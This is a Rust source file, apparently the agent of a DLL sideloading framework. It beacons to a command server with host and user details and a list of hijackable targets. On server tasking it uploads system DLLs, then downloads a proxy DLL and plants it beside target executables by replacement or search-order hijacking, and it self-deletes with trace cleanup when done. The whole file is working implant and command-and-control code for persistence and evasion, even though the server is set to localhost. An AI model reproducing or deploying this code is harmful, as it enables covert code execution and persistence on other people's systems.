mod cleanup;
mod scanner;

use std::fs;
use std::path::{Path, PathBuf};
use std::thread;
use std::time::Duration;

use reqwest::blocking::{Client, multipart};
use serde::{Deserialize, Serialize};

// ── Config ───────────────────────────────────────────────────

const SERVER_URL: &str = "http://127.0.0.1:8443";
const CHECKIN_INTERVAL: Duration = Duration::from_secs(5);
const SCAN_PATHS: &[&str] = &["E:\\code\\DLLProxyFramework\\test\\smoketest"];

// ── API types ────────────────────────────────────────────────

#[derive(Serialize)]
struct CheckinRequest {
    client_id: String,
    hostname: String,
    username: String,
    os_info: String,
    targets: Vec<scanner::SideloadTarget>,
}

#[derive(Deserialize, Debug)]
struct CheckinResponse {
    #[serde(default)]
    status: String,
    #[serde(default)]
    tasks: Vec<Task>,
}

#[derive(Deserialize, Debug)]
struct Task {
    #[serde(default)]
    id: String,
    #[serde(rename = "type", default)]
    task_type: String,
    #[serde(default)]
    target_id: i64,
    #[serde(default)]
    build_id: Option<String>,
    #[serde(default)]
    dll_name: Option<String>,
    #[serde(default)]
    source_dll: Option<String>,
    #[serde(default)]
    exe_path: Option<String>,
    #[serde(default)]
    vector: Option<String>,
}

// ── System info ──────────────────────────────────────────────

fn get_hostname() -> String {
    std::env::var("COMPUTERNAME").unwrap_or_else(|_| "unknown".into())
}

fn get_username() -> String {
    std::env::var("USERNAME").unwrap_or_else(|_| "unknown".into())
}

fn get_os_info() -> String {
    let ver = std::env::var("OS").unwrap_or_default();
    let arch = if cfg!(target_arch = "x86_64") { "x64" } else { "x86" };
    format!("{} {}", ver, arch)
}

fn get_client_id() -> String {
    let id_file = std::env::temp_dir().join(".dllproxy_id");
    if let Ok(id) = fs::read_to_string(&id_file) {
        let id = id.trim().to_string();
        if !id.is_empty() {
            return id;
        }
    }
    let id = uuid::Uuid::new_v4().to_string().replace('-', "")[..16].to_string();
    let _ = fs::write(&id_file, &id);
    id
}

// ── Task handlers ────────────────────────────────────────────

fn handle_upload_dll(client: &Client, task: &Task, client_id: &str) {
    let build_id = match &task.build_id {
        Some(id) => id.clone(),
        None => { eprintln!("[!] upload task missing build_id"); return; }
    };

    // Determine which DLL to upload
    let dll_path = if let Some(src) = &task.source_dll {
        if Path::new(src).is_file() {
            PathBuf::from(src)
        } else if let Some(dll_name) = &task.dll_name {
            // Try to find it in system dirs
            let windir = std::env::var("WINDIR").unwrap_or_else(|_| r"C:\Windows".into());
            let sys_path = Path::new(&windir).join("System32").join(dll_name);
            if sys_path.is_file() { sys_path } else {
                eprintln!("[!] Cannot find source DLL: {}", src);
                return;
            }
        } else {
            eprintln!("[!] No source DLL path");
            return;
        }
    } else {
        eprintln!("[!] No source_dll in task");
        return;
    };

    let dll_name = dll_path.file_name()
        .and_then(|n| n.to_str())
        .unwrap_or("unknown.dll")
        .to_string();

    eprintln!("[*] Uploading DLL: {} ({})", dll_name, dll_path.display());

    let file_bytes = match fs::read(&dll_path) {
        Ok(b) => b,
        Err(e) => { eprintln!("[!] Failed to read DLL: {}", e); return; }
    };

    let form = multipart::Form::new()
        .text("build_id", build_id)
        .text("client_id", client_id.to_string())
        .part("file", multipart::Part::bytes(file_bytes).file_name(dll_name));

    match client.post(format!("{}/api/upload", SERVER_URL))
        .multipart(form)
        .send()
    {
        Ok(resp) => {
            if resp.status().is_success() {
                eprintln!("[+] DLL uploaded successfully");
            } else {
                eprintln!("[!] Upload failed: {}", resp.status());
            }
        }
        Err(e) => eprintln!("[!] Upload error: {}", e),
    }
}

fn handle_deploy_proxy(client: &Client, task: &Task) {
    let build_id = match &task.build_id {
        Some(id) => id.clone(),
        None => { eprintln!("[!] deploy task missing build_id"); return; }
    };

    // Download the compiled proxy DLL
    eprintln!("[*] Downloading proxy DLL (build {})", build_id);
    let resp = match client.get(format!("{}/api/download/{}", SERVER_URL, build_id)).send() {
        Ok(r) => r,
        Err(e) => { eprintln!("[!] Download error: {}", e); return; }
    };

    if !resp.status().is_success() {
        eprintln!("[!] Download failed: {}", resp.status());
        return;
    }

    let proxy_bytes = match resp.bytes() {
        Ok(b) => b,
        Err(e) => { eprintln!("[!] Failed to read response: {}", e); return; }
    };

    let dll_name = task.dll_name.as_deref().unwrap_or("proxy.dll");
    let exe_path = task.exe_path.as_deref().unwrap_or("");
    let vector = task.vector.as_deref().unwrap_or("search_order");

    let deploy_dir = Path::new(exe_path).parent().unwrap_or(Path::new("."));

    match vector {
        "replace" => {
            // Back up original, place proxy
            let target = deploy_dir.join(dll_name);
            let backup = deploy_dir.join(format!("{}.bak", dll_name));
            if target.is_file() && !backup.exists() {
                if let Err(e) = fs::rename(&target, &backup) {
                    eprintln!("[!] Backup failed: {}", e);
                    return;
                }
                eprintln!("[*] Backed up original to {}", backup.display());
            }
            if let Err(e) = fs::write(&target, &proxy_bytes) {
                eprintln!("[!] Deploy failed: {}", e);
                let _ = fs::rename(&backup, &target);
                return;
            }
            // Remove the backup — the proxy embeds the original anyway
            let _ = fs::remove_file(&backup);
            eprintln!("[+] Deployed (replace): {}", target.display());
        }
        _ => {
            // Search-order / phantom: just place the proxy in the app dir
            let target = deploy_dir.join(dll_name);
            if let Err(e) = fs::write(&target, &proxy_bytes) {
                eprintln!("[!] Deploy failed: {}", e);
                return;
            }
            eprintln!("[+] Deployed (plant): {}", target.display());
        }
    }

    // Report success
    let _ = client.post(format!("{}/api/deployed", SERVER_URL))
        .json(&serde_json::json!({"build_id": build_id}))
        .send();

    // Mission complete — clean up all traces and self-delete
    cleanup::run();
}

// ── Main loop ────────────────────────────────────────────────

fn main() {
    eprintln!("[*] DLL Proxy Scanner starting");
    eprintln!("[*] Server: {}", SERVER_URL);

    let client_id = get_client_id();
    eprintln!("[*] Client ID: {}", client_id);

    // Scan once at startup
    eprintln!("[*] Scanning system...");
    let targets = scanner::scan_system(SCAN_PATHS);
    eprintln!("[+] Scan complete: {} targets found", targets.len());

    let http = Client::builder()
        .timeout(Duration::from_secs(30))
        .build()
        .expect("failed to create HTTP client");

    loop {
        // Check in with server
        let checkin = CheckinRequest {
            client_id: client_id.clone(),
            hostname: get_hostname(),
            username: get_username(),
            os_info: get_os_info(),
            targets: targets.clone(),
        };

        match http.post(format!("{}/api/checkin", SERVER_URL))
            .json(&checkin)
            .send()
        {
            Ok(resp) => {
                let body = resp.text().unwrap_or_default();
                match serde_json::from_str::<CheckinResponse>(&body) {
                    Ok(data) => {
                        for task in &data.tasks {
                            eprintln!("[*] Task: {} (target #{})", task.task_type, task.target_id);
                            match task.task_type.as_str() {
                                "upload_dll" => handle_upload_dll(&http, task, &client_id),
                                "deploy_proxy" => handle_deploy_proxy(&http, task),
                                other => eprintln!("[?] Unknown task type: {}", other),
                            }
                        }
                    }
                    Err(e) => eprintln!("[!] Parse checkin response: {}", e),
                }
            }
            Err(e) => eprintln!("[!] Checkin failed: {}", e),
        }

        thread::sleep(CHECKIN_INTERVAL);
    }
}
